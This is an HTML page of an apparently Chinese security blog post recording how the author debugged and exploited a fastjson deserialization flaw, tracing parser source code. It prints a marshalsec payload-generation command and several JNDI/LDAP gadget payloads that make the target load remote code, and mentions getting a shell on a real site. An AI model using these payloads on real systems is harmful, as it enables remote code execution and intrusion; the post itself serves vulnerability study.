@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    <title>fastjson 调试利用记录 | 5alt&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="前几天和雨日一个站，发现有fastjson的问题，死活利用不成功。找大佬们帮忙要来exp弹shell成功了，事后学习下原理。之前从来没搞过java，于是拉着雨对着Ricter的博客一起跟了一遍流程，带我学习了一波。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson 调试利用记录">
+<meta property="og:url" content="http://5alt.me/2017/09/fastjson调试利用记录/index.html">
+<meta property="og:site_name" content="5alt&#39;s Blog">
+<meta property="og:description" content="前几天和雨日一个站，发现有fastjson的问题，死活利用不成功。找大佬们帮忙要来exp弹shell成功了，事后学习下原理。之前从来没搞过java，于是拉着雨对着Ricter的博客一起跟了一遍流程，带我学习了一波。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-08-16T04:24:28.785Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="fastjson 调试利用记录">
+<meta name="twitter:description" content="前几天和雨日一个站，发现有fastjson的问题，死活利用不成功。找大佬们帮忙要来exp弹shell成功了，事后学习下原理。之前从来没搞过java，于是拉着雨对着Ricter的博客一起跟了一遍流程，带我学习了一波。">
+    
+
+    
+        <link rel="alternate" href="/atom.xml" title="5alt&#39;s Blog" type="application/atom+xml">
+    
+
+    
+
+    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/libs/open-sans/styles.css">
+    <link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <script src="/libs/jquery/2.1.3/jquery.min.js"></script>
+    
+    
+        <link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+    
+    
+    
+        <script type="text/javascript">
+(function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-61217444-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+    
+    
+    
+
+
+</head>
+</html>
+<body>
+    <div id="container">
+        <header id="header">
+    <div id="header-main" class="header-inner">
+        <div class="outer">
+            <a href="/" id="logo">
+                <i class="logo"></i>
+                <span class="site-title">5alt&#39;s Blog</span>
+            </a>
+            <nav id="main-nav">
+                
+                    <a class="main-nav-link" href="/.">主页</a>
+                
+                    <a class="main-nav-link" href="/archives">归档</a>
+                
+                    <a class="main-nav-link" href="/about">关于我</a>
+                
+                    <a class="main-nav-link" href="/learn">Learn</a>
+                
+                    <a class="main-nav-link" href="/wiki">WIKI</a>
+                
+                    <a class="main-nav-link" href="/tools">小工具</a>
+                
+                    <a class="main-nav-link" href="/talks">Talks</a>
+                
+            </nav>
+            
+                
+                <nav id="sub-nav">
+                    <div class="profile" id="profile-nav">
+                        <a id="profile-anchor" href="javascript:;">
+                            <img class="avatar" src="/css/images/avatar.png" />
+                            <i class="fa fa-caret-down"></i>
+                        </a>
+                    </div>
+                </nav>
+            
+            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="搜索" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="想要查找什么..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+</div>
+        </div>
+    </div>
+    <div id="main-nav-mobile" class="header-sub header-inner">
+        <table class="menu outer">
+            <tr>
+                
+                    <td><a class="main-nav-link" href="/.">主页</a></td>
+                
+                    <td><a class="main-nav-link" href="/archives">归档</a></td>
+                
+                    <td><a class="main-nav-link" href="/about">关于我</a></td>
+                
+                    <td><a class="main-nav-link" href="/learn">Learn</a></td>
+                
+                    <td><a class="main-nav-link" href="/wiki">WIKI</a></td>
+                
+                    <td><a class="main-nav-link" href="/tools">小工具</a></td>
+                
+                    <td><a class="main-nav-link" href="/talks">Talks</a></td>
+                
+                <td>
+                    
+    <div class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="搜索" />
+    </div>
+
+                </td>
+            </tr>
+        </table>
+    </div>
+</header>
+
+        <div class="outer">
+            
+                
+
+<aside id="profile">
+    <div class="inner profile-inner">
+        <div class="base-info profile-block">
+            <img id="avatar" src="/css/images/avatar.png" />
+            <h2 id="name">md5_salt</h2>
+            <h3 id="title">Researcher</h3>
+            <span id="location"><i class="fa fa-map-marker"></i>Beijing, China</span>
+            <a id="follow" target="_blank" href="https://github.com/5alt/">关注我</a>
+        </div>
+        <div class="article-info profile-block">
+            <div class="article-info-block">
+                29
+                <span>文章</span>
+            </div>
+            <div class="article-info-block">
+                0
+                <span>标签</span>
+            </div>
+        </div>
+        
+        <div class="profile-block social-links">
+            <table>
+                <tr>
+                    
+                    
+                    <td>
+                        <a href="https://github.com/5alt/" target="_blank" title="github" class=tooltip>
+                            <i class="fa fa-github"></i>
+                        </a>
+                    </td>
+                    
+                    <td>
+                        <a href="https://twitter.com/md5_salt" target="_blank" title="twitter" class=tooltip>
+                            <i class="fa fa-twitter"></i>
+                        </a>
+                    </td>
+                    
+                    <td>
+                        <a href="/atom.xml" target="_blank" title="rss" class=tooltip>
+                            <i class="fa fa-rss"></i>
+                        </a>
+                    </td>
+                    
+                </tr>
+            </table>
+        </div>
+        
+    </div>
+</aside>
+
+            
+            <section id="main"><article id="post-fastjson调试利用记录" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+            <header class="article-header">
+                
+    
+        <h1 class="article-title" itemprop="name">
+            fastjson 调试利用记录
+        </h1>
+    
+
+                
+                    <div class="article-meta">
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/2017/09/fastjson调试利用记录/">
+            <time datetime="2017-09-05T16:00:00.000Z" itemprop="datePublished">2017-09-06</time>
+        </a>
+    </div>
+
+
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/web/">web</a>
+    </div>
+
+                        
+                    </div>
+                
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+            
+            <p>前几天和雨日一个站，发现有fastjson的问题，死活利用不成功。找大佬们帮忙要来exp弹shell成功了，事后学习下原理。<br>之前从来没搞过java，于是拉着雨对着<code>Ricter</code>的博客一起跟了一遍流程，带我学习了一波。<br><a id="more"></a></p>
+<h2 id="fastjson-解析过程"><a href="#fastjson-解析过程" class="headerlink" title="fastjson 解析过程"></a>fastjson 解析过程</h2><p>跟了一遍 fastjson。对代码细节不关心的同学，可以直接跳过这个过程。</p>
+<p>从 JSON.parse 开始，把PoC作为输入，F7一路跟下去，可以看到 fastjson 的解析过程。</p>
+<p>我们输入的第一个字符为<code>{</code>，这表示解析出来的结果是一个 Object。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//./src/main/java/com/alibaba/fastjson/parser/DefaultJSONParser.java:public Object parse(Object fieldName)</span></span><br><span class="line"><span class="keyword">case</span> LBRACE:</span><br><span class="line">    JSONObject object = <span class="keyword">new</span> JSONObject(lexer.isEnabled(Feature.OrderedField));</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.parseObject((Map)object, fieldName);</span><br></pre></td></tr></table></figure></p>
+<p>在这里调用了<code>parseObject</code>来继续解析。</p>
+<p>首先遇到的是第一个key<code>@type</code>，然后进行了以下的判断，如果是<code>@type</code>并且启用了特殊key检查的话，那么就把对应的value作为类来加载。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//./src/main/java/com/alibaba/fastjson/parser/DefaultJSONParser.java:public final Object parseObject(final Map object, Object fieldName)</span></span><br><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">    ...</span><br><span class="line">    ObjectDeserializer deserializer = config.getDeserializer(clazz);</span><br><span class="line">    <span class="keyword">return</span> deserializer.deserialze(<span class="keyword">this</span>, clazz, fieldName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>在加载这个类的时候比较复杂，如果是java里常见的基本类型就直接新建一个对应的实例，fastjson里也内置了一些常见类的反序列化方法。由于现在我们的类并不常见，也不在内置的黑名单里，于是最终调用了<code>createJavaBeanDeserializer</code>来进行反序列化。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//./src/main/java/com/alibaba/fastjson/parser/ParserConfig.java:public ObjectDeserializer getDeserializer(Class&lt;?&gt; clazz, Type type)</span></span><br><span class="line"><span class="keyword">if</span> (type <span class="keyword">instanceof</span> WildcardType || type <span class="keyword">instanceof</span> TypeVariable || type <span class="keyword">instanceof</span> ParameterizedType) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">String className = clazz.getName();</span><br><span class="line">className = className.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123; <span class="comment">//黑名单检查</span></span><br><span class="line">    String deny = denyList[i];</span><br><span class="line">    <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"parser deny : "</span> + className);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">derializer = <span class="keyword">this</span>.createJavaBeanDeserializer(clazz, (Type)type);</span><br><span class="line"><span class="keyword">this</span>.putDeserializer((Type)type, (ObjectDeserializer)derializer);</span><br><span class="line"><span class="keyword">return</span> (ObjectDeserializer)derializer;</span><br></pre></td></tr></table></figure></p>
+<p>在<code>JavaBeanDeserializer</code>的构造函数里，我们发现调用了<code>JavaBeanInfo.build</code>。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//./src/main/java/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java:public JavaBeanDeserializer(ParserConfig config, Class&lt;?&gt; clazz, Type type)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">JavaBeanDeserializer</span><span class="params">(ParserConfig config, Class&lt;?&gt; clazz, Type type)</span></span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(config, JavaBeanInfo.build(clazz, type, config.propertyNamingStrategy));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在<code>JavaBeanInfo.build</code>里，会把目标类的方法和字段遍历一遍，分不同情况进行处理。类里面没有用<code>@JSONField</code>标记过的方法需要满足一些条件才能被加到列表里。</p>
+<p>比如有些方法需要满足以下条件。</p>
+<ul>
+<li>方法名需要大于4</li>
+<li>不能是静态方法</li>
+<li>返回类型要么是<code>void</code>要么是当前类</li>
+<li>参数只有一个</li>
+<li>方法名需要以<code>set</code>开头。</li>
+</ul>
+<p>这些方法是典型的类成员变量的<code>setter</code>方法。通过这些方法的名字可以推测出对应的成员变量的名字。除了按照javaBean的规范来解析，fastjson还会推测一些其他的写法。</p>
+<ul>
+<li>第4个字母大写或者是Unicode的方法，取<code>set</code>后面的字符并剩下第一个字符转成小写当做变量名</li>
+<li>第4个字母是<code>_</code>，取<code>_</code>后面的字符当做变量名</li>
+<li>第4个字母是<code>f</code>，取<code>set</code>后面的字符当做变量名</li>
+<li>第5个字母大写并且长度大于5，取<code>set</code>后面的字符并剩下第一个字符转成小写当做变量名</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//./src/main/java/com/alibaba/fastjson/util/JavaBeanInfo.java:public static JavaBeanInfo build(Class&lt;?&gt; clazz, Type type, PropertyNamingStrategy propertyNamingStrategy)</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (methodName.length() &lt; <span class="number">4</span>) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (Modifier.isStatic(method.getModifiers())) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) <span class="keyword">continue</span>;</span><br><span class="line"> Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line"><span class="keyword">if</span> (types.length != <span class="number">1</span>) <span class="keyword">continue</span>;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (!methodName.startsWith(<span class="string">"set"</span>)) <span class="keyword">continue</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>同样的，对于<code>public static fields</code>和<code>getter</code>方法也会加入到列表里。</p>
+<p>生成这些列表的时候也会判断成员变量是不是<code>public</code>的，会做一个标记说明是否能直接访问。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//./src/main/java/com/alibaba/fastjson/util/FieldInfo.java</span></span><br><span class="line"><span class="keyword">if</span> (field != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> modifiers = field.getModifiers();</span><br><span class="line">    fieldAccess = ((modifiers &amp; Modifier.PUBLIC) != <span class="number">0</span> || method == <span class="keyword">null</span>);</span><br><span class="line">    fieldTransient = Modifier.isTransient(modifiers)</span><br><span class="line">            || TypeUtils.isTransient(method);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    fieldAccess = <span class="keyword">false</span>;</span><br><span class="line">    fieldTransient = <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>接下来就要进行<code>deserialze</code>操作了。<br>首先遍历前面生成的类的<code>fields</code>表，先对他们用对应的<code>Deserializers</code>处理一遍。猜测这步是为了给成员变量赋一个默认的值。<br>在遍历完成之后，再解析提交的json里的数据，调用<code>parseField</code>进行反序列化的处理。<code>parseField</code>处理了<code>Feature.SupportNonPublicField</code>的情况。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//./src/main/java/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java:protected &lt;T&gt; T deserialze(DefaultJSONParser parser, Type type, Object fieldName, Object object, int features)</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> fieldIndex = <span class="number">0</span>;; fieldIndex++) &#123;</span><br><span class="line">     <span class="keyword">boolean</span> matchField = <span class="keyword">false</span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (fieldIndex &lt; sortedFieldDeserializers.length) &#123;</span><br><span class="line">        fieldDeser = sortedFieldDeserializers[fieldIndex];</span><br><span class="line">        fieldInfo = fieldDeser.fieldInfo;</span><br><span class="line">        fieldClass = fieldInfo.fieldClass;</span><br><span class="line">        feildAnnotation = fieldInfo.getAnnotation();</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (fieldDeser != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (lexer.matchStat == JSONLexer.NOT_MATCH_NAME) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!matchField) &#123;</span><br><span class="line">        key = lexer.scanSymbol(parser.symbolTable);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (matchField) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">boolean</span> match = parseField(parser, key, object, type, fieldValues);</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
+<p>在<code>parseField</code>中，选择合适的反序列化的方法，最终在<code>setValue</code>里调用类的<code>setter</code>方法。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//./src/main/java/com/alibaba/fastjson/parser/deserializer/FieldDeserializer.java:public void setValue(Object object, Object value)</span></span><br><span class="line"><span class="keyword">if</span> (fieldInfo.getOnly) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    method.invoke(object, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="fastjson-的执行逻辑以及利用思路"><a href="#fastjson-的执行逻辑以及利用思路" class="headerlink" title="fastjson 的执行逻辑以及利用思路"></a>fastjson 的执行逻辑以及利用思路</h2><p>简单而言，fastjson 会从客户端接收一段json数据，并解析成为一个类的实例。<br>fastjson 有个叫做<code>@type</code>的特殊的key，可以指定当前json数据被反序列化为哪个类。这个类不能在内置的黑名单里。<br>类里不止有<code>public</code>类型的成员变量，还会有<code>private</code>的。<br>对<code>public</code>类型的成员变量，可以直接为它赋值。对<code>private</code>的，需要调用对应的<code>setter</code>方法才能访问到这些变量，除非启用<code>SupportNonPublicField</code>这个特性。</p>
+<p>利用的思路为，找到java里一些可以访问到的类，查看里面的一些<code>setter</code>方法除了设置变量之外还做了什么其他的可能造成危险的操作，通过反序列化这个类并填充数据，最终调用危险的<code>setter</code>方法，完成利用。</p>
+<p>对于<code>fastjson</code>来说，只要调用了<code>JSON.parse(text1);</code>或者<code>JSON.parseObject(text1, Object.class);</code>即有可能出现问题，而不一定需要设置<code>SupportNonPublicField</code>，这个看具体的利用思路。</p>
+<p>当然，除了这种可能造成rce的利用方式，还可以在知道源码的情况下或者猜测成员变量设置一些原始请求中没有的属性。如注册用户时的<code>admin</code>属性等。</p>
+<h2 id="fastjson-rce的利用"><a href="#fastjson-rce的利用" class="headerlink" title="fastjson rce的利用"></a>fastjson rce的利用</h2><p><code>Ricter</code>大佬直接丢过来一个讲java反序列化的<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">github地址</a>，说思路同jackson。<br>在这个github里有人整理了一些可以利用的java类并给出了对应的poc。有直接执行<code>bytecode</code>的，也有<code>JNDI</code>的。</p>
+<p>下载编译好之后<br><code>java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.Jackson -a exploit.exec=&quot;calc&quot;</code><br>即可生成用于<code>jackson</code>的payload。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">"org.springframework.beans.factory.config.PropertyPathFactoryBean"</span>,&#123;<span class="attr">"targetBeanName"</span>:<span class="string">"ldap://localhost:1389/obj"</span>,<span class="attr">"propertyPath"</span>:<span class="string">"foo"</span>,<span class="attr">"beanFactory"</span>:[<span class="string">"org.springframework.jndi.support.SimpleJndiBeanFactory"</span>,&#123;<span class="attr">"shareableResources"</span>:[<span class="string">"ldap://localhost:1389/obj"</span>]&#125;]&#125;]</span><br><span class="line"></span><br><span class="line">[<span class="string">"java.util.HashSet"</span>,[[<span class="string">"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor"</span>,&#123;<span class="attr">"beanFactory"</span>:[<span class="string">"org.springframework.jndi.support.SimpleJndiBeanFactory"</span>,&#123;<span class="attr">"shareableResources"</span>:[<span class="string">"ldap://localhost:1389/obj"</span>]&#125;],<span class="attr">"adviceBeanName"</span>:<span class="string">"ldap://localhost:1389/obj"</span>&#125;],[<span class="string">"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor"</span>,&#123;&#125;]]]</span><br><span class="line"></span><br><span class="line">[<span class="string">"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"</span>,&#123;<span class="attr">"userOverridesAsString"</span>:<span class="string">"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383038302f740003466f6f;"</span>&#125;]</span><br><span class="line"></span><br><span class="line">[<span class="string">"com.mchange.v2.c3p0.JndiRefForwardingDataSource"</span>,&#123;<span class="attr">"jndiName"</span>:<span class="string">"ldap://localhost:1389/obj"</span>,<span class="attr">"loginTimeout"</span>:<span class="number">0</span>&#125;]</span><br></pre></td></tr></table></figure>
+<p><code>Ricter</code>大佬在微博上发的利用<code>com.sun.rowset.JdbcRowSetImpl</code>这个类的方法可以在github里附带的一个pdf里找到。跟到这个类里去，发现在<code>setAutoCommit</code>的时候会调用<code>this.connect()</code>，在<code>connect()</code>里能加载远程的方法执行。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//com.sun.rowset.JdbcRowSetImpl</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAutoCommit</span><span class="params">(<span class="keyword">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.conn = <span class="keyword">this</span>.connect();</span><br><span class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> Connection <span class="title">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.conn;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InitialContext var1 = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            DataSource var2 = (DataSource)var1.lookup(<span class="keyword">this</span>.getDataSourceName());</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.getUsername() != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.getUsername().equals(<span class="string">""</span>) ? var2.getConnection(<span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="keyword">this</span>.resBundle.handleGetObject(<span class="string">"jdbcrowsetimpl.connect"</span>).toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getUrl() != <span class="keyword">null</span> ? DriverManager.getConnection(<span class="keyword">this</span>.getUrl(), <span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在利用的时候，开启rmi服务，发现会有请求过来，但是死活利用不成功。最后<code>Tomato</code>大佬给出问题的原因和解决方案，把服务器的hostname设置成外网ip就行了。</p>
+<p>另外ph大佬在微博上提到 java 8u121 增加了trustURLCodebase选项，默认打不了了。<br>虽然有些利用方法可能在将来失效，但是一些漏洞产生原理还是值得学习的。</p>
+<p>最后感谢雨神带我日站，感谢<code>Ricter</code>大佬在微博上发fastjson的exp指点我用<code>marshalsec</code>，感谢<code>Tomato</code>大佬指明rmi服务器无法连接成功的原因。</p>
+<p>这几天发现大佬们又开始讨论<code>fastjson</code>的利用问题，那个站大概就是起因吧。:P</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://ricterz.me/posts/Fastjson%20Unserialize%20Vulnerability%20Write%20Up" target="_blank" rel="noopener">https://ricterz.me/posts/Fastjson%20Unserialize%20Vulnerability%20Write%20Up</a><br><a href="http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review.html" target="_blank" rel="noopener">http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review.html</a><br><a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec</a></p>
+
+        
+        </div>
+        <footer class="article-footer">
+            <div class="share-container">
+
+
+
+</div>
+
+    <a data-url="http://5alt.me/2017/09/fastjson调试利用记录/" data-id="cjzj8jt09002vgnpj8topkcps" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+<script>
+    (function ($) {
+        // Prevent duplicate binding
+        if (typeof(__SHARE_BUTTON_BINDED__) === 'undefined' || !__SHARE_BUTTON_BINDED__) {
+            __SHARE_BUTTON_BINDED__ = true;
+        } else {
+            return;
+        }
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
